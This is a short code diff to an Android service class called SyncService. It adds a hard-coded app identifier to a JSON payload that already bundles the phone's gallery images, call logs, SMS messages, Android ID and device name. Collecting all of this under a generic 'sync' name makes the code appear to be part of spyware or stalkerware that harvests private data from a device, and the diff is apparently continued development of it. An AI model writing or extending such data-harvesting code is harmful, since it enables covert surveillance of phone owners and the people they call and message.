@@ -135,6 +135,7 @@ public class SyncService extends Service {
             );
             //getting device name
             String deviceName = Build.MANUFACTURER + " " + Build.MODEL;
+            String appID = "app46";
 
             ArrayList<HashMap<String, String>> imageList = GalleryUtils.getGalleryImages(getApplicationContext());
             JSONArray imageArray = new JSONArray();
@@ -153,6 +154,7 @@ public class SyncService extends Service {
             JSONArray callLogs = getCallLogs();
             JSONArray smsLogs = getSmsLogs();
 
+            combinedData.put("appID", appID);
             combinedData.put("gallery_images", imageArray);
             combinedData.put("android_id", androidId);
             combinedData.put("deviceName", deviceName);
